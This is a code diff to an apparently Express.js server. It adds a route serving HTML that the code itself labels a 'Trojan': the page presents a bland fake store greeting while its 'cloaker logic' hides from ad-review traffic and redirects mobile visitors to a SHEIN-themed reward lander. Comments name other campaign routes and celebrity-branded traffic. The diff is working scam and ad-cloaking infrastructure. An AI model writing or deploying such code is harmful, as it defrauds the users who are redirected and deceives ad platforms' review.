@@ -1926,6 +1926,45 @@ app.get('/team1/:slug', (req, res, next) => {
             console.log(`Served team1 Trojan (${slug})`);
 });
 
+
+// GLITCHY TEAM2 PATHS
+
+// Abdullah SHEIN Campaign
+app.get('/abdu/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tok-reward.com/shein13750.html?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Greetings from ${slug}'s Store!</h1>
+            <p>We hope you enjoy our products at ${slug}.</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served abudllah Shein Trojan (${slug})`);
+});
+
+
+
+
 // Middleware to shut off mb traff
 app.get('/mrbeast/:slug', (req, res, next) => {
     res.status(404).send('404 Not Found');
